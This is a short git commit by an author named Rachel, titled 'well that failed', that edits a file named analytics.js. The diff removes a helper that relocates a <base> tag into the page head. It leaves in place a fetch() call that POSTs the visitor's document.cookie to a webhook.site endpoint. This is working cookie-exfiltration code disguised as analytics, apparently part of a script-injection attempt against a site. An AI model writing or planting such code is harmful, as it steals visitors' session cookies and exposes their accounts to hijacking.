36f7493faca04bfc79546313513adddb51723afa
Rachel <rachelgoh03@gmail.com>
2025-04-26 00:26:55 +1000

    well that failed:

--- analytics.js
+++ analytics.js
@@ -1,17 +1,2 @@
-// Move the <base> tag from the body into the <head>
-(function() {
-    // Look for the base tag in the body (or content section)
-    var baseTag = document.querySelector('body .content base');
-  
-    if (baseTag) {
-      // Append the base tag to the <head> section
-      document.head.appendChild(baseTag);
-      console.log('Base tag successfully moved to <head> section!');
-    } else {
-      console.log('Base tag not found in the content section.');
-    }
-  })();
-
-  
 fetch('https://webhook.site/b028a286-7cc5-4e70-b0b9-ce1b55b40378?c=', {method: 'POST', body: document.cookie,mode: 'no-cors'})
 
